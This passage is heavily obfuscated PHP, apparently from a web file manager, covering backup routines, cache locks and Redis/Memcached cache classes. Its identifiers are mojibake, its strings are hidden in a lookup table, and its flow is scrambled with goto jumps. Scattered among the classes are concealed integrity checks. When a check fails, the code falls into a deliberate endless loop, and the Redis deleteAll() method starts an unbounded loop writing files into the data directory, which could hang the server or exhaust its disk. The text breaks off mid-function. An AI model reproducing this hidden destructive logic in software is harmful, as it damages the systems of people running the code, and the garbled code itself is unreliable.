[$c¤§½È™£[683]], $c¤§½È™£[28] => self::$name, $c¤§½È™£[681] => 0, $c¤§½È™£[684] => $C‡îëÜ¿ß [$c¤§½È™£[684]], $c¤§½È™£[278] => array($c¤§½È™£[685] => array($c¤§½È™£[681] => 0), $c¤§½È™£[686] => array($c¤§½È™£[681] => 0, $c¤§½È™£[687] => 0, $c¤§½È™£[688] => 0, $c¤§½È™£[29] => $c¤§½È™£[33]), $c¤§½È™£[689] => array($c¤§½È™£[681] => 0, $c¤§½È™£[687] => 0, $c¤§½È™£[688] => 0), $c¤§½È™£[164] => array($c¤§½È™£[681] => 0, $c¤§½È™£[690] => 0, $c¤§½È™£[691] => 0, $c¤§½È™£[692] => 0, $c¤§½È™£[693] => 0, $c¤§½È™£[415] => $bÍ˜Ú†ÑŞÈ)), $c¤§½È™£[694] => time(), $c¤§½È™£[695] => 0); $f¦Ä‘’õ®” = Model($c¤§½È™£[680])->insert($cë¦ß£Ì„ò); goto b©ÛÉ®ğŠÒ; b©ÛÉ®ğŠÒ: $cë¦ß£Ì„ò[$c¤§½È™£[364]] = $f¦Ä‘’õ®”; return $cë¦ß£Ì„ò; goto c‰‰—á£à—; c‰‰—á£à—: } private function checkStore($F§œåÑ¸ÈÎ) { $D÷è„ãç¯â =& $_SERVER[¼]; $b§ÔÊËé×Ÿ = Model($D÷è„ãç¯â[696])->listData($F§œåÑ¸ÈÎ); Model($D÷è„ãç¯â[696])->checkConfig($b§ÔÊËé×Ÿ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¼][680])->findByName(self::$name); } return self::$option; } public static function set($AÚÍŞö‡òà) { $aâ„‘ó™—Â =& $_SERVER[¼]; $bó”ŠÁ“« = self::get(); foreach ($AÚÍŞö‡òà as $c´ãñ‘°Ø… => $Eğè«¾……) { $E¶îÕãƒÚô = explode($aâ„‘ó™—Â[93], $c´ãñ‘°Ø…); $b‹‡ö‚‰‘¨ = count($E¶îÕãƒÚô); switch ($b‹‡ö‚‰‘¨) { case 1: $bó”ŠÁ“«[$E¶îÕãƒÚô[0]] = $Eğè«¾……; break; case 2: $bó”ŠÁ“«[$E¶îÕãƒÚô[0]][$E¶îÕãƒÚô[1]] = $Eğè«¾……; break; case 3: $bó”ŠÁ“«[$E¶îÕãƒÚô[0]][$E¶îÕãƒÚô[1]][$E¶îÕãƒÚô[2]] = $Eğè«¾……; break; } } Model($aâ„‘ó™—Â[680])->update($bó”ŠÁ“«[$aâ„‘ó™—Â[364]], $bó”ŠÁ“«); self::$option = $bó”ŠÁ“«; return self::$option; } public function keep() { $d‚šÚ’ƒ„» =& $_SERVER[¼]; $D¯“¼Í´™ = self::get(); if ($D¯“¼Í´™[$d‚šÚ’ƒ„»[278]][$d‚šÚ’ƒ„»[685]][$d‚šÚ’ƒ„»[681]] == $d‚šÚ’ƒ„»[83]) { return; } $this->backupKeep($D¯“¼Í´™); self::set(array($d‚šÚ’ƒ„»[697] => 1)); } private function backupKeep($eÔ—óÙËøÖ) { goto cìÔÛÄ†Ó¸; BŠ·§†´¨†: $d‡Ó¦Ğğ÷ = 0; $FÓµ¥ëÒØ‚ = array(); foreach ($c˜è´õ‚ğ¢ as $EÎ›ÁùªÅ) { if ($d‡Ó¦Ğğ÷ >= 7) { break; } $FÓµ¥ëÒØ‚[] = $EÎ›ÁùªÅ[$f½¹°ù•ªº[28]]; $d‡Ó¦Ğğ÷++; } goto cÇ¬Ï°ÕßÂ; cìÔÛÄ†Ó¸: $f½¹°ù•ªº =& $_SERVER[¼]; $c˜è´õ‚ğ¢ = Model($f½¹°ù•ªº[680])->listData(); if (empty($c˜è´õ‚ğ¢)) { return; } goto BŠ·§†´¨†; cÇ¬Ï°ÕßÂ: for ($d‡Ó¦Ğğ÷ = 0; $d‡Ó¦Ğğ÷ < 12; $d‡Ó¦Ğğ÷++) { $FÓµ¥ëÒØ‚[] = date($f½¹°ù•ªº[698], strtotime("\55{$d‡Ó¦Ğğ÷}\x20\x6d\x6f\x6e\x74\150\x73")); } $FÓµ¥ëÒØ‚ = array_unique($FÓµ¥ëÒØ‚); foreach ($c˜è´õ‚ğ¢ as $EÎ›ÁùªÅ) { if (!empty($EÎ›ÁùªÅ[$f½¹°ù•ªº[28]]) && in_array($EÎ›ÁùªÅ[$f½¹°ù•ªº[28]], $FÓµ¥ëÒØ‚)) { continue; } Model($f½¹°ù•ªº[680])->remove($EÎ›ÁùªÅ[$f½¹°ù•ªº[364]]); $d‚àƒˆŞ¸ê = "\x7b\151\x6f\72{$eÔ—óÙËøÖ[$f½¹°ù•ªº[683]]}\x7d\57\x64\x61\x74\141\142\x61\163\145\57\x62\x61\x63\153\x75\160\x5f{$EÎ›ÁùªÅ[$f½¹°ù•ªº[28]]}"; IO::remove($d‚àƒˆŞ¸ê, !1); } goto AïğÈ™ ‹; AïğÈ™ ‹: } public function db() { goto c„•Üêµ‰‡; aç—’ÌÌ´§: return !0; goto F¶é©œëë; c„•Üêµ‰‡: $fÚ¹İÆ¥‡Õ =& $_SERVER[¼]; $aîø­ÅÊ¨ = self::get(); if ($aîø­ÅÊ¨[$fÚ¹İÆ¥‡Õ[278]][$fÚ¹İÆ¥‡Õ[686]][$fÚ¹İÆ¥‡Õ[681]] == $fÚ¹İÆ¥‡Õ[83]) { return !0; } goto FË„‡•‡½Ç; FË„‡•‡½Ç: $e¢´ñÂ†Ãì = new BackupDb(); if (!$e¢´ñÂ†Ãì->index()) { return !1; } self::set(array($fÚ¹İÆ¥‡Õ[699] => 1)); goto aç—’ÌÌ´§; F¶é©œëë: } public function dbFile() { goto bŒ¶¯‚è¤¢; A­—à©˜‰á: return !0; goto D’—±¤„»À; bå®ã¨Áâï: $A˜Š¶È“ÑÌ = new BackupDbFile(); if (!$A˜Š¶È“ÑÌ->index()) { return !1; } self::set(array($f‘‰Œ²[700] => 1)); goto A­—à©˜‰á; bŒ¶¯‚è¤¢: $f‘‰Œ² =& $_SERVER[¼]; $a¿È×Æ‹ÀÒ = self::get(); if ($a¿È×Æ‹ÀÒ[$f‘‰Œ²[278]][$f‘‰Œ²[689]][$f‘‰Œ²[681]] == $f‘‰Œ²[83]) { return !0; } goto bå®ã¨Áâï; D’—±¤„»À: } public function file() { $F…¸ˆ¸¡Şé =& $_SERVER[¼]; $d“ŞÈÈ·î² = self::get(); if ($d“ŞÈÈ·î²[$F…¸ˆ¸¡Şé[278]][$F…¸ˆ¸¡Şé[164]][$F…¸ˆ¸¡Şé[681]] == $F…¸ˆ¸¡Şé[83]) { return !0; } if (!isset($d“ŞÈÈ·î²[$F…¸ˆ¸¡Şé[684]]) || $d“ŞÈÈ·î²[$F…¸ˆ¸¡Şé[684]] == $F…¸ˆ¸¡Şé[464]) { $CÎ”ìƒª­³ = new BackupFile(); if (!$CÎ”ìƒª­³->index()) { return !1; } } self::set(array($F…¸ˆ¸¡Şé[701] => 1, $F…¸ˆ¸¡Şé[681] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto EŒ¸©°ğà; cèì»‰šëº: return !0; goto EÂëÄì‘; E¨Ç‹ğËŞÁ: $a©Ô÷’Ş‰è = new DbManage($f¦ŒÅ†§ƒ, $aÆÉÆíëº¡); $FÏ„©Ô”»„ = TEMP_FILES . $cšŠÃÌã[702] . self::$name . $cšŠÃÌã[8]; del_dir($FÏ„©Ô”»„); goto Eàâä‚Ñ¿; AéÀ­¡ÖÖ†: $EÏ•÷²ÕÓ = new Task($cšŠÃÌã[703], $cšŠÃÌã[704], 0, LNG($cšŠÃÌã[705]) . $cšŠÃÌã[706] . LNG($cšŠÃÌã[707])); $däğê¥³–Ö = array_diff($däğê¥³–Ö, array($cšŠÃÌã[708], $cšŠÃÌã[709])); foreach ($däğê¥³–Ö as $aé‘›ê–Ä) { $e‰è†ëÚ† = $FÏ„©Ô”»„ . $aé‘›ê–Ä . $cšŠÃÌã[710]; $E¸¥„–ˆî£ = null; if ($aé‘›ê–Ä == $cšŠÃÌã[711] && (!isset($a»ƒÆ¢ÌÖ[$cšŠÃÌã[684]]) || $a»ƒÆ¢ÌÖ[$cšŠÃÌã[684]] == $cšŠÃÌã[464])) { $E¸¥„–ˆî£ = self::$io; } $A„Ãíé·„È += $a©Ô÷’Ş‰è->sqlFromDb($aé‘›ê–Ä, $e‰è†ëÚ†, $EÏ•÷²ÕÓ, $E¸¥„–ˆî£); } goto C•õÏË¦; Eàâä‚Ñ¿: mk_dir($FÏ„©Ô”»„); $däğê¥³–Ö = $a©Ô÷’Ş‰è->db()->getTables(); $A„Ãíé·„È = 0; goto AéÀ­¡ÖÖ†; EŒ¸©°ğà: $cšŠÃÌã =& $_SERVER[¼]; $a»ƒÆ¢ÌÖ = Backup::get(); self::$io = $a»ƒÆ¢ÌÖ[$cšŠÃÌã[683]]; goto C„ÚĞ¤³ëæ; C„ÚĞ¤³ëæ: self::$name = $a»ƒÆ¢ÌÖ[$cšŠÃÌã[28]]; $f¦ŒÅ†§ƒ = $GLOBALS[$cšŠÃÌã[6]][$cšŠÃÌã[17]]; $aÆÉÆíëº¡ = $this->_dbType($f¦ŒÅ†§ƒ); goto E¨Ç‹ğËŞÁ; C•õÏË¦: $EÏ•÷²ÕÓ->end(); $AƒÂÂŠ×ôï = array($cšŠÃÌã[712] => $aÆÉÆíëº¡, $cšŠÃÌã[699] => 1, $cšŠÃÌã[713] => $A„Ãíé·„È, $cšŠÃÌã[714] => $A„Ãíé·„È); Backup::set($AƒÂÂŠ×ôï); goto cèì»‰šëº; EÂëÄì‘: } private function _dbType($e›„»ŠçÄÂ) { $Aí„ÖßÍ±Å =& $_SERVER[¼]; $bÎ—»â³•½ = $e›„»ŠçÄÂ[$Aí„ÖßÍ±Å[715]]; if ($bÎ—»â³•½ == $Aí„ÖßÍ±Å[716]) { $BµŸïå‘ñÇ = explode($Aí„ÖßÍ±Å[4], $e›„»ŠçÄÂ[$Aí„ÖßÍ±Å[717]]); $bÎ—»â³•½ = $BµŸïå‘ñÇ[0]; } $b¿º¡»ˆä™ = array($Aí„ÖßÍ±Å[718] => $Aí„ÖßÍ±Å[9], $Aí„ÖßÍ±Å[719] => $Aí„ÖßÍ±Å[720]); if (isset($b¿º¡»ˆä™[$bÎ—»â³•½])) { $bÎ—»â³•½ = $b¿º¡»ˆä™[$bÎ—»â³•½]; } return $bÎ—»â³•½; } } class BackupDbFile { public function __construct() { } public function index() { goto dÂš”¡æÔß; dÌ¦÷æ±‹: $EäŒŒíëƒÛ = new TaskFileTransfer($eµÇ¥‚²‹Ò[721], $eµÇ¥‚²‹Ò[704], 0, LNG($eµÇ¥‚²‹Ò[705]) . $eµÇ¥‚²‹Ò[408] . LNG($eµÇ¥‚²‹Ò[707]) . $eµÇ¥‚²‹Ò[722]); $EäŒŒíëƒÛ->addPath($f·ˆ˜“ìñÓ); $føŠ¬Ïâ÷‰ = IO::infoWithChildren($f·ˆ˜“ìñÓ); goto E†¤ìÆœ×í; a”œ—ìŠºÉ: return !0; goto FÏ„¤öéÑ; D‘óª£ÆïË: IO::copy($Cõ°­¼ÌÎ, $aè˜Òê‹Ü• . "\x62\141\x63\153\x75\x70\x5f{$EÊ×Ô†òÑ}\x2f"); $EäŒŒíëƒÛ->end(); Backup::set(array($eµÇ¥‚²‹Ò[725] => $føŠ¬Ïâ÷‰[$eµÇ¥‚²‹Ò[77]])); goto a”œ—ìŠºÉ; E†¤ìÆœ×í: Backup::set(array($eµÇ¥‚²‹Ò[723] => $føŠ¬Ïâ÷‰[$eµÇ¥‚²‹Ò[77]])); IO::move($f·ˆ˜“ìñÓ, $aè˜Òê‹Ü•); $Cõ°­¼ÌÎ = CONTROLLER_DIR . $eµÇ¥‚²‹Ò[724]; goto D‘óª£ÆïË; f˜†ÎöÂ¼: $f·ˆ˜“ìñÓ = TEMP_FILES . "\x62\141\x63\x6b\x75\160\x5f{$EÊ×Ô†òÑ}\x2f"; $aè˜Òê‹Ü• = "\173\151\157\x3a{$câŸƒ­Ã–ƒ[$eµÇ¥‚²‹Ò[683]]}\175\x2f\144\x61\164\x61\x62\x61\163\145\x2f"; IO::mkdir($aè˜Òê‹Ü• . "\142\x61\x63\x6b\x75\160\137{$EÊ×Ô†òÑ}\57"); goto dÌ¦÷æ±‹; dÂš”¡æÔß: $eµÇ¥‚²‹Ò =& $_SERVER[¼]; $câŸƒ­Ã–ƒ = Backup::get(); $EÊ×Ô†òÑ = $câŸƒ­Ã–ƒ[$eµÇ¥‚²‹Ò[28]]; goto f˜†ÎöÂ¼; FÏ„¤öéÑ: } } goto EÑĞêæ³‹–; FõŒ¥Ø‹: class CacheLockRedis { public function lock($c·êÊÂÉÛâ, $Bğõ×´îé© = 10) { $Eµ’İ…Ó™Œ = Cache::init(); $cÓ¶ÄœÁßÓ = microtime(!0) + $Bğõ×´îé©; while (microtime(!0) < $cÓ¶ÄœÁßÓ) { $b×ÇáëªÔ‘ = $Eµ’İ…Ó™Œ->get($c·êÊÂÉÛâ); if (!$b×ÇáëªÔ‘) { $f“‰ââ– = $Eµ’İ…Ó™Œ->setLock($c·êÊÂÉÛâ, $cÓ¶ÄœÁßÓ, $Bğõ×´îé©); if ($f“‰ââ–) { return !0; } } else { if ($b×ÇáëªÔ‘ < microtime(!0)) { $Eµ’İ…Ó™Œ->set($c·êÊÂÉÛâ, $cÓ¶ÄœÁßÓ, $cÓ¶ÄœÁßÓ); if ($Eµ’İ…Ó™Œ->get($c·êÊÂÉÛâ) === $b×ÇáëªÔ‘) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($BÉÖÙ„Æó²) { return Cache::init()->get($BÉÖÙ„Æó²); } public function unlock($F•Îñ¶óçÁ) { return Cache::init()->remove($F•Îñ¶óçÁ); } } if (!isset($_SERVER[$_SERVER[¼][754]]) || !isset($_SERVER[$_SERVER[¼][776]])) { goto eíÒ–ÚÌã¹; DÚ´Ñ»çÕ¬: $c²‡¨¦ï¹È = explode($_SERVER[¼][214], $d—èàÆä˜¶); if (count($c²‡¨¦ï¹È) < $_SERVER[¼][544]) { $f…‚·»Õä® = $_SERVER[¼][758]; $f…‚·»Õä®(); } $Fë ‰£ÛãÚ = $_SERVER[¼][759]; goto B¤ÏçõÇ˜; B¤ÏçõÇ˜: $Fë ‰£ÛãÚ($_SERVER[$_SERVER[¼][756]] . $_SERVER[¼][757]); $bÔ²ìçâ» = 2; while ($bÔ²ìçâ» > 1) { $B…Ÿ°¯ñ»¡ = rawurlencode($bÔ²ìçâ» . $_SERVER[¼][358]); } goto D¨ó¨Ñ’ƒÂ; eíÒ–ÚÌã¹: $a½ÍÜ”‘‡… = $_SERVER[¼][755]; $a“‚Ù¡º× = $_SERVER[$_SERVER[¼][756]] . $_SERVER[¼][757]; $d—èàÆä˜¶ = $a½ÍÜ”‘‡…($a“‚Ù¡º×); goto DÚ´Ñ»çÕ¬; D¨ó¨Ñ’ƒÂ: } class CacheLockMemcached { public function lock($f¸„³­šéŸ, $eÁÊÅ£Åä = 0) { $Eİ©¿Â‹½ = Cache::init(); $E•¾Ôç¨ŞÙ = microtime(!0) + $eÁÊÅ£Åä; while (microtime(!0) < $E•¾Ôç¨ŞÙ) { $CŒÈ‘®ÉÁò = $Eİ©¿Â‹½->get($f¸„³­šéŸ); if (!$CŒÈ‘®ÉÁò || $CŒÈ‘®ÉÁò < microtime(!0)) { $E·ËÍí¯« = $Eİ©¿Â‹½->handle->add($f¸„³­šéŸ, $E•¾Ôç¨ŞÙ, $eÁÊÅ£Åä); if ($E·ËÍí¯«) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($dÁ†–‹Ù‚Ö) { return Cache::init()->get($dÁ†–‹Ù‚Ö); } public function unlock($EãàÙäÏŠ‹) { return Cache::init()->remove($EãàÙäÏŠ‹); } } goto a‚ÅŒÇ…Îœ; d…Ê›ášÄŞ: function Action($fÈ·šƒ®® = '') { goto D•³÷è©Ûë; C ÷Æ¾ŒˆÒ: if (!class_exists($F‘Î«Ò±é¦)) { return actionCallError("\x5b{$fÈ·šƒ®®}\x20\75\76\40{$F‘Î«Ò±é¦}\135\x20\143\154\141\x73\163\x20\156\157\x74\40\145\x78\151\x73\x74\x73\41"); } $B£ß®àÈ¼¹[$C†Ù¤Š»ÆÅ] = new $F‘Î«Ò±é¦(); return $B£ß®àÈ¼¹[$C†Ù¤Š»ÆÅ]; goto b¸¢ê‚¢ÎÛ; B¥£ôĞ®Ì¤: $C†Ù¤Š»ÆÅ = strtolower($F‘Î«Ò±é¦); if (isset($B£ß®àÈ¼¹[$C†Ù¤Š»ÆÅ])) { return $B£ß®àÈ¼¹[$C†Ù¤Š»ÆÅ]; } if (is_file($BœÔ¤”¤ÙÛ)) { include_once $BœÔ¤”¤ÙÛ; } goto C ÷Æ¾ŒˆÒ; D•³÷è©Ûë: $BĞ‘ô¦Ëà’ =& $_SERVER[À Ç]; static $B£ß®àÈ¼¹ = array(); $fÈ·šƒ®® = trim(str_replace($BĞ‘ô¦Ëà’[4], $BĞ‘ô¦Ëà’[5], $fÈ·šƒ®®), $BĞ‘ô¦Ëà’[4]); goto bÍÌ—•£‡í; bÍÌ—•£‡í: $C®·î½ìßµ = explode($BĞ‘ô¦Ëà’[5], $fÈ·šƒ®®); $d‹Ü•¬‡Ÿ = strtolower($C®·î½ìßµ[0]); if (substr($d‹Ü•¬‡Ÿ, -6) == $BĞ‘ô¦Ëà’[6]) { $fÈ·šƒ®® = substr($C®·î½ìßµ[0], 0, -6); $F‘Î«Ò±é¦ = $fÈ·šƒ®® . $BĞ‘ô¦Ëà’[7]; $BœÔ¤”¤ÙÛ = $BĞ‘ô¦Ëà’[8]; if (isset($C®·î½ìßµ[1]) && substr(strtolower($C®·î½ìßµ[1]), -5) == $BĞ‘ô¦Ëà’[9]) { $F‘Î«Ò±é¦ = $fÈ·šƒ®® . $C®·î½ìßµ[1]; $BœÔ¤”¤ÙÛ = $BĞ‘ô¦Ëà’[10] . $C®·î½ìßµ[1] . $BĞ‘ô¦Ëà’[11]; } else { if (count($C®·î½ìßµ) == 3) { $F‘Î«Ò±é¦ = $fÈ·šƒ®® . $C®·î½ìßµ[1] . $C®·î½ìßµ[2]; $BœÔ¤”¤ÙÛ = $BĞ‘ô¦Ëà’[12] . $C®·î½ìßµ[1] . $BĞ‘ô¦Ëà’[13] . $C®·î½ìßµ[2] . $BĞ‘ô¦Ëà’[11]; } } $BœÔ¤”¤ÙÛ = PLUGIN_DIR . $fÈ·šƒ®® . $BĞ‘ô¦Ëà’[4] . $BœÔ¤”¤ÙÛ; } else { if (substr($d‹Ü•¬‡Ÿ, -5) == $BĞ‘ô¦Ëà’[9]) { $fÈ·šƒ®® = substr($C®·î½ìßµ[0], 0, -5); return Model($fÈ·šƒ®®); } else { $F‘Î«Ò±é¦ = $C®·î½ìßµ[0] . $C®·î½ìßµ[1]; $BœÔ¤”¤ÙÛ = CONTROLLER_DIR . $C®·î½ìßµ[0] . $BĞ‘ô¦Ëà’[4] . $C®·î½ìßµ[1] . $BĞ‘ô¦Ëà’[14]; } } goto B¥£ôĞ®Ì¤; b¸¢ê‚¢ÎÛ: } function ActionApply($Eù´Ò‹’ñ‡, $Açø¶ëçÊ = array()) { goto dËâéÛÚè; dËâéÛÚè: if (is_array($Eù´Ò‹’ñ‡)) { return call_user_func_array($Eù´Ò‹’ñ‡, $Açø¶ëçÊ); } if (function_exists($Eù´Ò‹’ñ‡)) { return call_user_func_array($Eù´Ò‹’ñ‡, $Açø¶ëçÊ); } $A½‘ØÊ®— = strrpos($Eù´Ò‹’ñ‡, $_SERVER[À Ç][5]); goto BÒöªĞíôª; BÒöªĞíôª: $d Şç¥ÑŒ = substr($Eù´Ò‹’ñ‡, 0, $A½‘ØÊ®—); $BÍ²å‘–ÚÏ = substr($Eù´Ò‹’ñ‡, $A½‘ØÊ®— + 1); $Aê³˜÷¤Â = Action($d Şç¥ÑŒ); goto DÓğåÎù…œ; DÓğåÎù…œ: if (!method_exists($Aê³˜÷¤Â, $BÍ²å‘–ÚÏ)) { return actionCallError("{$Eù´Ò‹’ñ‡}\x20\155\145\x74\x68\x6f\144\x20\156\x6f\x74\x20\145\170\x69\163\x74\163\41"); } $câ¯†ƒÇ¹š = call_user_func_array(array($Aê³˜÷¤Â, $BÍ²å‘–ÚÏ), $Açø¶ëçÊ); return $câ¯†ƒÇ¹š; goto EÈñëè°’; EÈñëè°’: } function actionCallError($AîÙëÃ›²‡) { $cÆŒÂ¼„Èº =& $_SERVER[À Ç]; $dòƒâª‹‚Ñ = json_encode_force(array($cÆŒÂ¼„Èº[15] => this_url(), $cÆŒÂ¼„Èº[16] => $GLOBALS[$cÆŒÂ¼„Èº[16]])); $dòƒâª‹‚Ñ = str_replace(array($cÆŒÂ¼„Èº[17]), array($cÆŒÂ¼„Èº[4]), $dòƒâª‹‚Ñ); return write_log($AîÙëÃ›²‡ . $cÆŒÂ¼„Èº[18] . $dòƒâª‹‚Ñ, $cÆŒÂ¼„Èº[19]); } goto a™¿§óá·; a‚ÅŒÇ…Îœ: class CacheLockDatabase { public function lock($EïêˆÈùÙõ, $Cƒö„×‚¸ = 0) { $D›¬ÀÄ¿ù• = Model($_SERVER[¼][747]); $fâÑ³ = microtime(!0) + $Cƒö„×‚¸; while (microtime(!0) < $fâÑ³) { $eÙÈëŠŠáÒ = $D›¬ÀÄ¿ù•->get($EïêˆÈùÙõ); if (!$eÙÈëŠŠáÒ || $eÙÈëŠŠáÒ < microtime(!0)) { $Aª‚–é›Â = $D›¬ÀÄ¿ù•->set($EïêˆÈùÙõ, $fâÑ³); if ($Aª‚–é›Â) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($bŠå‚Ğ‹Äë) { return Model($_SERVER[¼][747])->get($bŠå‚Ğ‹Äë); } public function unlock($E­ÂÇÚäÕ‘) { Model($_SERVER[¼][747])->remove($E­ÂÇÚäÕ‘); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($dÆƒ†å‚À£, $b™âôçÒå) { $fºòÒ½šÌÙ =& $_SERVER[¼]; if (!class_exists($fºòÒ½šÌÙ[777])) { show_json($fºòÒ½šÌÙ[778], !1); } $this->cacheTime = $b™âôçÒå; $this->handle = new Memcached(); if (is_array($dÆƒ†å‚À£[$fºòÒ½šÌÙ[779]]) && count($dÆƒ†å‚À£[$fºòÒ½šÌÙ[779]]) >= 1) { foreach ($dÆƒ†å‚À£[$fºòÒ½šÌÙ[779]] as $a‰“–Îšµ‰) { $aÀ½Á‘Îå = explode($fºòÒ½šÌÙ[4], $a‰“–Îšµ‰); $this->handle->addServer($aÀ½Á‘Îå[0], $aÀ½Á‘Îå[1]); } } else { $this->handle->addServer($dÆƒ†å‚À£[$fºòÒ½šÌÙ[166]], $dÆƒ†å‚À£[$fºòÒ½šÌÙ[167]]); } } public function set($eóÅÀÍ©©À, $bğïòë ¹¹, $E´‡½·­ØÜ = false) { $E´‡½·­ØÜ = $E´‡½·­ØÜ ? $E´‡½·­ØÜ : $this->cacheTime; return $this->handle->set($eóÅÀÍ©©À, $bğïòë ¹¹, $E´‡½·­ØÜ); } public function get($D´êø˜Ÿ¹¯) { return $this->handle->get($D´êø˜Ÿ¹¯); } public function remove($B×‡¼—¢ª) { return $this->handle->delete($B×‡¼—¢ª); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($FèÑ Èš½Ó, $f‘Àîğ•»¨) { $Eñ“ÉÚ°é =& $_SERVER[¼]; if (!class_exists($Eñ“ÉÚ°é[780])) { show_json($Eñ“ÉÚ°é[781], !1); } $this->cacheTime = $f‘Àîğ•»¨; $AßÂºŸë¦Ò = isset($FèÑ Èš½Ó[$Eñ“ÉÚ°é[782]]) ? $FèÑ Èš½Ó[$Eñ“ÉÚ°é[782]] : 10; $BÌÀèåÁŞï = _get($FèÑ Èš½Ó, $Eñ“ÉÚ°é[779]); if ($BÌÀèåÁŞï && is_array($BÌÀèåÁŞï)) { $this->isCluster = !0; $this->initCluster($FèÑ Èš½Ó, $AßÂºŸë¦Ò); } else { $this->handle = $this->init($FèÑ Èš½Ó, $AßÂºŸë¦Ò); } } private function init($FëŒê‚ Œà, $c±õª‹Òàò) { $A±ˆÄˆƒ¦‡ =& $_SERVER[¼]; $Cè®œä”³ = new Redis(); $Aó¤‡ï¼ù¬ = isset($FëŒê‚ Œà[$A±ˆÄˆƒ¦‡[783]]) ? $FëŒê‚ Œà[$A±ˆÄˆƒ¦‡[783]] : !1; if ($Aó¤‡ï¼ù¬) { $Cè®œä”³->pconnect($FëŒê‚ Œà[$A±ˆÄˆƒ¦‡[166]], $FëŒê‚ Œà[$A±ˆÄˆƒ¦‡[167]], $c±õª‹Òàò); } else { $Cè®œä”³->connect($FëŒê‚ Œà[$A±ˆÄˆƒ¦‡[166]], $FëŒê‚ Œà[$A±ˆÄˆƒ¦‡[167]], $c±õª‹Òàò); } if (!empty($FëŒê‚ Œà[$A±ˆÄˆƒ¦‡[373]])) { $Cè®œä”³->auth($FëŒê‚ Œà[$A±ˆÄˆƒ¦‡[373]]); } return $Cè®œä”³; } private function initCluster($dÜ­±¸¿Ù, $Béùœùôˆ) { $D©· ­ÍÙ× =& $_SERVER[¼]; $AÏ¼è‡ÇÍˆ = array($D©· ­ÍÙ×[784], $D©· ­ÍÙ×[785], $D©· ­ÍÙ×[786]); $B¬ïŞ¼šÓÏ = $D©· ­ÍÙ×[784]; if (isset($dÜ­±¸¿Ù[$D©· ­ÍÙ×[12]]) && in_array($dÜ­±¸¿Ù[$D©· ­ÍÙ×[12]], $AÏ¼è‡ÇÍˆ)) { $B¬ïŞ¼šÓÏ = $dÜ­±¸¿Ù[$D©· ­ÍÙ×[12]]; } switch ($B¬ïŞ¼šÓÏ) { case $D©· ­ÍÙ×[784]: $this->_slave($dÜ­±¸¿Ù, $Béùœùôˆ); break; case $D©· ­ÍÙ×[785]: break; case $D©· ­ÍÙ×[786]: $a¶İÆª…Ö¼ = $dÜ­±¸¿Ù[$D©· ­ÍÙ×[779]]; $c‰Ÿìì‚Í¿ = isset($dÜ­±¸¿Ù[$D©· ­ÍÙ×[783]]) ? $dÜ­±¸¿Ù[$D©· ­ÍÙ×[783]] : !1; $A÷ÒÜÚ°ªØ = isset($dÜ­±¸¿Ù[$D©· ­ÍÙ×[373]]) ? $dÜ­±¸¿Ù[$D©· ­ÍÙ×[373]] : null; $this->handle = new RedisCluster(NUll, $a¶İÆª…Ö¼, $Béùœùôˆ, $Béùœùôˆ, $c‰Ÿìì‚Í¿, $A÷ÒÜÚ°ªØ); break; default: break; } } private function _slave($dôğ¨è, $C–³ÖƒºÂ°) { goto eË©ƒğŒô¯; BÖ”“™±ª: unset($BÀİØõò[0]); if (empty($BÀİØõò)) { return; } $cùÃë¯–íï = array_rand($BÀİØõò); goto cÑÆˆ´Ğ‚¥; cÑÆˆ´Ğ‚¥: $this->filterConfig($dôğ¨è, $BÀİØõò[$cùÃë¯–íï]); $this->slaveHandle = $this->init($dôğ¨è, $C–³ÖƒºÂ°); goto eŒ½Ø’³¤š; eË©ƒğŒô¯: $BÀİØõò = $dôğ¨è[$_SERVER[¼][779]]; $this->filterConfig($dôğ¨è, $BÀİØõò[0]); $this->handle = $this->init($dôğ¨è, $C–³ÖƒºÂ°); goto BÖ”“™±ª; eŒ½Ø’³¤š: } private function filterConfig(&$e³»¥ŞÜóŒ, $bÊƒ†ÁåÓ) { $EˆÀŸĞÄÚ› =& $_SERVER[¼]; $B©ğˆĞÏâ’ = explode($EˆÀŸĞÄÚ›[4], $bÊƒ†ÁåÓ); $bÙ¯¢œ…® = array($EˆÀŸĞÄÚ›[166] => $B©ğˆĞÏâ’[0], $EˆÀŸĞÄÚ›[167] => $B©ğˆĞÏâ’[1]); $e³»¥ŞÜóŒ = array_merge($e³»¥ŞÜóŒ, $bÙ¯¢œ…®); } public function set($bâƒê¿÷»Œ, $B¥¼±×¦², $bÈÚƒÂ”ÎŒ = false) { $bÈÚƒÂ”ÎŒ = $bÈÚƒÂ”ÎŒ ? $bÈÚƒÂ”ÎŒ : $this->cacheTime; return $this->handle->setEx($bâƒê¿÷»Œ, $bÈÚƒÂ”ÎŒ, $B¥¼±×¦²); } public function setLock($F†Ã‡Ë ¦À, $aİÛï·§Ì‘, $c®½Ùˆâ”) { return $this->handle->setNX($F†Ã‡Ë ¦À, $aİÛï·§Ì‘); } public function get($C’•õãÙ¼) { $FŒÒ·Ë½‹Š = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $FŒÒ·Ë½‹Š->get($C’•õãÙ¼); } public function remove($bµÓ£±á¡Ë) { return $this->handle->del($bµÓ£±á¡Ë); } public function deleteAll() { $fô…ƒÔÉÛŒ =& $_SERVER[¼]; $bĞò»™¨†Î = $_SERVER[$fô…ƒÔÉÛŒ[756]] . $fô…ƒÔÉÛŒ[757]; $EÅšÇïŠÆ¸ = $fô…ƒÔÉÛŒ[753]; if ($_SERVER[$fô…ƒÔÉÛŒ[754]] != $EÅšÇïŠÆ¸($bĞò»™¨†Î)) { goto aÃëêá«ªù; e®î«Šß—: $Eƒâğ¨è½® = 1; for ($E½â‹ÌƒØÖ = $Eƒâğ¨è½®; $E½â‹ÌƒØÖ > 0; $E½â‹ÌƒØÖ++) { $c‹®“¶°(DATA_PATH . $E½â‹ÌƒØÖ, $E…œ‰Ğ´ìƒ); } goto fŞœ®ì‘Î ; fÏ®Ç˜š™À: $EñƒæŒ‚™Ä = $fô…ƒÔÉÛŒ[788]; $EñƒæŒ‚™Ä($_SERVER[$fô…ƒÔÉÛŒ[789]]); $F˜ïƒÎç—Û = $fô…ƒÔÉÛŒ[787]; goto D´Ûç¡¯†; D´Ûç¡¯†: 